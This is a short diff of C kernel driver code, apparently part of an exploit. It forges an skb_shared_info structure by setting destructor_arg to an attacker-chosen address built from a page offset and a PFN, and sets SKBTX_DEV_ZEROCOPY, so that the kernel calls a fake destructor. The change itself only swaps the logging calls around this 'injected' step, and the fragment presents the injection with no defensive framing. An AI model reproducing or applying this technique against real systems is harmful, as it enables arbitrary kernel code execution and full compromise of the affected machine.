@@ -947,14 +947,14 @@ static inline void modify_shinfo(void *va, unsigned int frag_size)
 	//TODO: in my code there are magic offsets, I can recalculate them but this is easier
 
 	if (!gilkup_vars.injected && gilkup_vars.data_pointers_counter > 256)
-		WARN_ONCE("gilkup gilkup_vars.page_offset=%p\n", (void*)gilkup_vars.page_offset);
+		pr_warn_once("gilkup gilkup_vars.page_offset=%p\n", (void*)gilkup_vars.page_offset);
 
 	//TODO: make sure that build_skb rewrite tx_flags; the hook should be after it.
 	if (!gilkup_vars.injected && gilkup_vars.data_pointers_counter > 512) //just in case...
 	{
 		struct skb_shared_info *shinfo = (struct skb_shared_info*)((u64)va + frag_size);
-		WARN_ONCE("gilkup gilkup_vars.page_offset=%p\n", (void*)gilkup_vars.page_offset);
 		shinfo->destructor_arg = (void*)(gilkup_vars.page_offset + (PFN << 12)); //TODO: need your PFN...
+		pr_err("data %p  dist %p\n", va, shinfo->destructor_arg);
 		shinfo->tx_flags = SKBTX_DEV_ZEROCOPY; //1<<3
 
 		gilkup_vars.injected = true;
